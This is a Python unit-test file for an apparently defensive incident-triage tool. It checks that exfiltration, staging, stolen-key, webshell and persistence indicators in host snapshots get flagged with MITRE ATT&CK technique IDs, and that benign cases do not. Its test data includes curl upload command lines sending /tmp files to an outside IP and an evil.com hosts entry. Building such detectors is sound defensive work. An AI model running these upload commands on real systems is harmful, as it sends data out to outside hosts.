import unittest
import json
import copy
import os
from bluekit.kb.query import KB
from bluekit.resp.triage import analyze


def find(findings, category=None, substr=None):
    res = findings
    if category is not None:
        res = [f for f in res if f.get('category') == category]
    if substr is not None:
        substr_l = str(substr).lower()
        res = [f for f in res if substr_l in str(f.get('item', '')).lower() or any(substr_l in str(r).lower() for r in f.get('reasons', []))]
    return res


class TestTriageExfil(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.kb = KB()
        fixtures_dir = os.path.join(os.path.dirname(__file__), 'fixtures')
        with open(os.path.join(fixtures_dir, 'snap_web-prod-01.json'), encoding='utf-8') as f:
            cls.snap_web = json.load(f)
        with open(os.path.join(fixtures_dir, 'base_web-prod-01.json'), encoding='utf-8') as f:
            cls.base_web = json.load(f)
        with open(os.path.join(fixtures_dir, 'snap_db-prod-02.json'), encoding='utf-8') as f:
            cls.snap_db = json.load(f)
        with open(os.path.join(fixtures_dir, 'base_db-prod-02.json'), encoding='utf-8') as f:
            cls.base_db = json.load(f)

    def test_01_web_chunk_group(self):
        findings, _ = analyze(self.kb, self.snap_web, baseline=self.base_web)
        chunk_findings = [f for f in findings if f['category'] == 'file' and '15 ta' in f['item'] and '/tmp' in f['item']]
        self.assertEqual(len(chunk_findings), 1)
        f = chunk_findings[0]
        self.assertEqual(f['confidence'], 'high')
        tech_ids = [t['id'] for t in f.get('techniques', [])]
        self.assertIn('T1074.001', tech_ids)
        self.assertIn('T1030', tech_ids)
        self.assertIn('T1560.001', tech_ids)
        for tid in tech_ids:
            v = self.kb.validate([tid])
            self.assertEqual(v[0]['status'], 'active')
        
        # Individual chunk items should not exist as separate findings
        indiv_chunks = [f for f in findings if f['category'] == 'file' and 'vault_chunk_' in f['item']]
        self.assertEqual(len(indiv_chunks), 0)

    def test_02_web_vault_tar_gz(self):
        findings, _ = analyze(self.kb, self.snap_web, baseline=self.base_web)
        vault_findings = [f for f in findings if f['category'] == 'file' and '/tmp/vault.tar.gz' in f['item']]
        self.assertEqual(len(vault_findings), 1)
        f = vault_findings[0]
        self.assertEqual(f['confidence'], 'med')
        tech_ids = [t['id'] for t in f.get('techniques', [])]
        self.assertIn('T1560.001', tech_ids)
        self.assertIn('T1074.001', tech_ids)

    def test_03_web_stolen_id_rsa(self):
        findings, _ = analyze(self.kb, self.snap_web, baseline=self.base_web)
        key_findings = [f for f in findings if f['category'] == 'file' and '/tmp/stolen_id_rsa' in f['item']]
        self.assertEqual(len(key_findings), 1)
        f = key_findings[0]
        self.assertEqual(f['confidence'], 'high')
        tech_ids = [t['id'] for t in f.get('techniques', [])]
        self.assertIn('T1552.004', tech_ids)

    def test_04_web_curl_upload_process(self):
        findings, _ = analyze(self.kb, self.snap_web, baseline=self.base_web)
        curl_proc = [f for f in findings if f['category'] == 'process' and 'curl' in f['item'] and '5120' in f['item']]
        self.assertEqual(len(curl_proc), 1)
        f = curl_proc[0]
        self.assertEqual(f['confidence'], 'high')
        tech_ids = [t['id'] for t in f.get('techniques', [])]
        self.assertIn('T1041', tech_ids)

    def test_05_web_connections_linkage(self):
        findings, _ = analyze(self.kb, self.snap_web, baseline=self.base_web)
        conn_curl = [f for f in findings if f['category'] == 'connections' and '203.0.113.88:443' in f['item']]
        self.assertEqual(len(conn_curl), 1)
        self.assertEqual(conn_curl[0]['confidence'], 'high')
        self.assertGreaterEqual(conn_curl[0]['score'], 0.7)
        curl_techs = [t['id'] for t in conn_curl[0]['techniques']]
        self.assertIn('T1041', curl_techs)
        self.assertIn('T1071.001', curl_techs)

        conn_py = [f for f in findings if f['category'] == 'connections' and '198.51.100.45:4444' in f['item']]
        self.assertEqual(len(conn_py), 1)
        self.assertEqual(conn_py[0]['confidence'], 'high')
        self.assertGreaterEqual(conn_py[0]['score'], 0.7)
        py_techs = [t['id'] for t in conn_py[0]['techniques']]
        self.assertIn('T1059.004', py_techs)
        self.assertIn('T1071.001', py_techs)

        conn_fpm = [f for f in findings if f['category'] == 'connections' and '10.0.2.20' in f['item']]
        self.assertEqual(len(conn_fpm), 0)

    def test_06_web_existing_findings_preserved(self):
        findings, _ = analyze(self.kb, self.snap_web, baseline=self.base_web)
        webshell = [f for f in findings if f['category'] == 'file' and 'avatar_8f3a.php' in f['item']]
        self.assertEqual(len(webshell), 1)
        self.assertEqual(webshell[0]['confidence'], 'high')

        cron_evil = [f for f in findings if f['category'] == 'cron' and '198.51.100.45' in f['item']]
        self.assertEqual(len(cron_evil), 1)
        self.assertEqual(cron_evil[0]['confidence'], 'high')

        daemon_user = [f for f in findings if f['category'] == 'users' and 'backup_daemon' in f['item']]
        self.assertEqual(len(daemon_user), 1)
        self.assertEqual(daemon_user[0]['confidence'], 'high')

        rootsh_suid = [f for f in findings if f['category'] == 'suid_files' and '/tmp/.cache/rootsh' in f['item']]
        self.assertEqual(len(rootsh_suid), 1)
        self.assertEqual(rootsh_suid[0]['confidence'], 'high')

    def test_07_db_dump_process_and_files(self):
        findings, _ = analyze(self.kb, self.snap_db, baseline=self.base_db)
        pg_proc = [f for f in findings if f['category'] == 'process' and 'pg_dump' in f['item']]
        self.assertEqual(len(pg_proc), 1)
        self.assertEqual(pg_proc[0]['confidence'], 'high')
        tech_ids = [t['id'] for t in pg_proc[0]['techniques']]
        self.assertIn('T1005', tech_ids)

        pg_cust = [f for f in findings if f['category'] == 'file' and '/tmp/pg_customer.dump' in f['item']]
        self.assertEqual(len(pg_cust), 1)
        self.assertEqual(pg_cust[0]['confidence'], 'high')
        cust_techs = [t['id'] for t in pg_cust[0]['techniques']]
        self.assertIn('T1005', cust_techs)
        self.assertIn('T1074.001', cust_techs)

        pg_pay = [f for f in findings if f['category'] == 'file' and '/tmp/pg_payment.dump' in f['item']]
        self.assertEqual(len(pg_pay), 1)
        self.assertEqual(pg_pay[0]['confidence'], 'high')
        pay_techs = [t['id'] for t in pg_pay[0]['techniques']]
        self.assertIn('T1005', pay_techs)
        self.assertIn('T1074.001', pay_techs)

        ssh_key = [f for f in findings if f['category'] == 'ssh_authorized_keys' and 'root@web-prod-01' in f['item']]
        self.assertEqual(len(ssh_key), 1)
        self.assertEqual(ssh_key[0]['confidence'], 'high')

    def test_08_baseline_comparison_zero_findings(self):
        findings_web, _ = analyze(self.kb, self.base_web, baseline=self.base_web)
        self.assertEqual(len(findings_web), 0)

        findings_db, _ = analyze(self.kb, self.base_db, baseline=self.base_db)
        self.assertEqual(len(findings_db), 0)

    def test_09_legitimate_ssh_key_in_dot_ssh(self):
        snap = {
            'meta': {'os': 'linux'},
            'suspicious_files': [
                {
                    'path': '/home/ubuntu/.ssh/id_ed25519',
                    'ext': '',
                    'size': 411,
                    'head': '-----BEGIN OPENSSH PRIVATE KEY-----',
                    'signed': 'n/a',
                    'exe_magic': False
                }
            ]
        }
        findings, _ = analyze(self.kb, snap, baseline=None)
        key_findings = [f for f in findings if f['category'] == 'file' and 'id_ed25519' in f['item']]
        self.assertEqual(len(key_findings), 0)

    def test_10_legitimate_backup_not_in_staging(self):
        snap = {
            'meta': {'os': 'linux'},
            'suspicious_files': [
                {
                    'path': '/var/backups/pg/cv.dump',
                    'ext': 'dump',
                    'size': 40_000_000,
                    'head': 'PGDMP',
                    'signed': 'n/a',
                    'exe_magic': False
                }
            ]
        }
        findings, _ = analyze(self.kb, snap, baseline=None)
        db_findings = [f for f in findings if f['category'] == 'file' and 'cv.dump' in f['item']]
        self.assertEqual(len(db_findings), 0)

    def test_11_legitimate_cron_pg_dump(self):
        snap = {
            'meta': {'os': 'linux'},
            'processes': [
                {'pid': 100, 'ppid': 1, 'name': 'cron', 'path': '/usr/sbin/cron', 'cmdline': '/usr/sbin/cron'},
                {'pid': 200, 'ppid': 100, 'name': 'pg_dump', 'path': '/usr/bin/pg_dump', 'cmdline': 'pg_dump -Fc customer_vault -f /var/backups/pg/cv.dump', 'user': 'postgres'}
            ]
        }
        findings, _ = analyze(self.kb, snap, baseline=None)
        pg_findings = [f for f in findings if f['category'] == 'process' and 'pg_dump' in f['item']]
        self.assertEqual(len(pg_findings), 0)

    def test_12_legitimate_curl_health_and_private_upload(self):
        snap = {
            'meta': {'os': 'linux'},
            'processes': [
                {'pid': 10, 'ppid': 1, 'name': 'curl', 'path': '/usr/bin/curl', 'cmdline': 'curl -s https://api.example.com/health'},
                {'pid': 11, 'ppid': 1, 'name': 'curl', 'path': '/usr/bin/curl', 'cmdline': 'curl -F f=@x http://10.0.0.5/upload'}
            ]
        }
        findings, _ = analyze(self.kb, snap, baseline=None)
        curl_findings = [f for f in findings if f['category'] == 'process' and 'curl' in f['item']]
        self.assertEqual(len(curl_findings), 0)

    def test_13_staging_grouping_boundaries(self):
        # 2 files with different stems: no group finding, but 1a med for each
        snap_diff_stems = {
            'meta': {'os': 'linux'},
            'suspicious_files': [
                {'path': '/tmp/a.gz', 'ext': 'gz', 'size': 5_000_000, 'head': '\x1f\x8b'},
                {'path': '/tmp/b.gz', 'ext': 'gz', 'size': 5_000_000, 'head': '\x1f\x8b'}
            ]
        }
        findings1, _ = analyze(self.kb, snap_diff_stems, baseline=None)
        group_findings1 = [f for f in findings1 if f['category'] == 'file' and 'ta bo\'lak' in f['item']]
        self.assertEqual(len(group_findings1), 0)
        indiv1 = [f for f in findings1 if f['category'] == 'file']
        self.assertEqual(len(indiv1), 2)
        for f in indiv1:
            self.assertEqual(f['confidence'], 'med')

        # 3 files with same stem but small size (10 KB): neither 1b nor 1a
        snap_small = {
            'meta': {'os': 'linux'},
            'suspicious_files': [
                {'path': '/tmp/chunk_1', 'ext': '', 'size': 10_000, 'head': '\x1f\x8b'},
                {'path': '/tmp/chunk_2', 'ext': '', 'size': 10_000, 'head': '\x1f\x8b'},
                {'path': '/tmp/chunk_3', 'ext': '', 'size': 10_000, 'head': '\x1f\x8b'}
            ]
        }
        findings2, _ = analyze(self.kb, snap_small, baseline=None)
        file_findings2 = [f for f in findings2 if f['category'] == 'file']
        self.assertEqual(len(file_findings2), 0)

    def test_14_baselineless_snap_web(self):
        findings, _ = analyze(self.kb, self.snap_web, baseline=None)
        chunk_findings = [f for f in findings if f['category'] == 'file' and '15 ta' in f['item']]
        self.assertEqual(len(chunk_findings), 1)
        self.assertEqual(chunk_findings[0]['confidence'], 'med')

    def test_15_order_independence(self):
        snap_rev = copy.deepcopy(self.snap_web)
        snap_rev['processes'] = list(reversed(snap_rev.get('processes', [])))
        snap_rev['connections'] = list(reversed(snap_rev.get('connections', [])))
        findings_orig, _ = analyze(self.kb, self.snap_web, baseline=self.base_web)
        findings_rev, _ = analyze(self.kb, snap_rev, baseline=self.base_web)

        orig_high_conns = sorted([f['item'] for f in findings_orig if f['category'] == 'connections' and f['confidence'] == 'high'])
        rev_high_conns = sorted([f['item'] for f in findings_rev if f['category'] == 'connections' and f['confidence'] == 'high'])
        self.assertEqual(orig_high_conns, rev_high_conns)
        self.assertIn('203.0.113.88:443 (curl)', orig_high_conns)
        self.assertIn('198.51.100.45:4444 (python3)', orig_high_conns)

    def test_16_hosts_file_scenarios(self):
        # (a) baseline'da bor ichki IP + baseline berilgan -> topilma yo'q
        snap_a = {'meta': {'os': 'linux'}, 'hosts_file': ['10.0.2.20 db-prod-02']}
        base_a = {'meta': {'os': 'linux'}, 'hosts_file': ['10.0.2.20 db-prod-02']}
        f_a, _ = analyze(self.kb, snap_a, baseline=base_a)
        self.assertEqual(len([f for f in f_a if f['category'] == 'hosts_file']), 0)

        # (b) baseline'da yo'q ichki IP -> topilma bor
        snap_b = {'meta': {'os': 'linux'}, 'hosts_file': ['10.0.2.20 db-prod-02']}
        base_b = {'meta': {'os': 'linux'}, 'hosts_file': []}
        f_b, _ = analyze(self.kb, snap_b, baseline=base_b)
        self.assertEqual(len([f for f in f_b if f['category'] == 'hosts_file']), 1)

        # (c) baseline'da bor TASHQI IP -> topilma qoladi
        snap_c = {'meta': {'os': 'linux'}, 'hosts_file': ['198.51.100.45 evil.com']}
        base_c = {'meta': {'os': 'linux'}, 'hosts_file': ['198.51.100.45 evil.com']}
        f_c, _ = analyze(self.kb, snap_c, baseline=base_c)
        self.assertEqual(len([f for f in f_c if f['category'] == 'hosts_file']), 1)
        self.assertEqual(f_c[0]['confidence'], 'high')

        # (d) baselinesiz ichki IP -> avvalgidek topilma
        snap_d = {'meta': {'os': 'linux'}, 'hosts_file': ['10.0.2.20 db-prod-02']}
        f_d, _ = analyze(self.kb, snap_d, baseline=None)
        self.assertEqual(len([f for f in f_d if f['category'] == 'hosts_file']), 1)
        self.assertEqual(f_d[0]['confidence'], 'med')

    def test_17_regression_minimal_snapshot(self):
        minimal_snap = {
            'meta': {'os': 'linux'},
            'processes': [{'pid': 1}],
            'suspicious_files': [{'path': '/tmp/x'}]
        }
        findings, extra = analyze(self.kb, minimal_snap, baseline=None)
        self.assertIsInstance(findings, list)
        self.assertIsInstance(extra, dict)




class TestTriageExfilRegression(unittest.TestCase):
    """Agy yozgan qoidalardagi soxta pozitivlar (curl -f, wget -t, tar -x, tizim kalitlari) va T1036.008 zaxirasi."""

    @classmethod
    def setUpClass(cls):
        cls.kb = KB()
        fx = os.path.join(os.path.dirname(__file__), 'fixtures')
        with open(os.path.join(fx, 'base_web-prod-01.json'), encoding='utf-8') as f:
            cls.base = json.load(f)

    def _proc_findings(self, cmdline, name):
        snap = copy.deepcopy(self.base)
        snap['processes'].append({'pid': 9001, 'ppid': 1, 'name': name, 'path': '/usr/bin/' + name, 'cmdline': cmdline,
                                  'user': 'root', 'start_time': '', 'signed': 'n/a', 'sha256': 'ab' * 32, 'exe_deleted': False})
        res, _ = analyze(self.kb, snap, baseline=self.base)
        return [f for f in res if '9001' in str(f['item'])]

    def test_upload_flags_case_sensitive(self):
        self.assertEqual(len(self._proc_findings('curl -f https://example.com/i.sh -o /opt/i.sh', 'curl')), 0)
        self.assertEqual(len(self._proc_findings('wget -t 3 https://example.com/f.tgz', 'wget')), 0)
        self.assertEqual(len(self._proc_findings('curl -F data=@/tmp/a https://203.0.113.88/u', 'curl')), 1)
        self.assertEqual(len(self._proc_findings('curl -T /tmp/a https://203.0.113.88/u', 'curl')), 1)

    def test_tar_only_create_mode(self):
        self.assertEqual(len(self._proc_findings('tar -xzf /tmp/b.tgz -C /var/www', 'tar')), 0)
        self.assertEqual(len(self._proc_findings('tar -czf /tmp/d.tgz /home/u', 'tar')), 1)
        self.assertEqual(len(self._proc_findings('tar czf /tmp/d.tgz /home/u', 'tar')), 1)

    def test_system_private_keys_not_flagged(self):
        snap = copy.deepcopy(self.base)
        key = '-----BEGIN PRIVATE KEY-----\nMII'
        for path in ('/etc/ssl/private/server.key', '/etc/ssh/ssh_host_rsa_key'):
            snap['suspicious_files'].append({'path': path, 'ext': 'key', 'size': 1700, 'mtime': '', 'ctime': '', 'sha256': path,
                                             'signed': 'n/a', 'exe_magic': False, 'hidden': False, 'head': key, 'webshell_hint': False})
        snap['suspicious_files'].append({'path': '/tmp/leaked.key', 'ext': 'key', 'size': 1700, 'mtime': '', 'ctime': '', 'sha256': 'x',
                                         'signed': 'n/a', 'exe_magic': False, 'hidden': False, 'head': key, 'webshell_hint': False})
        res, _ = analyze(self.kb, snap, baseline=self.base)
        keys = [f for f in res if f['category'] == 'file' and 'private key' in str(f.get('reasons'))]
        self.assertEqual(len(keys), 1)
        self.assertIn('/tmp/leaked.key', keys[0]['item'])


if __name__ == '__main__':
    unittest.main()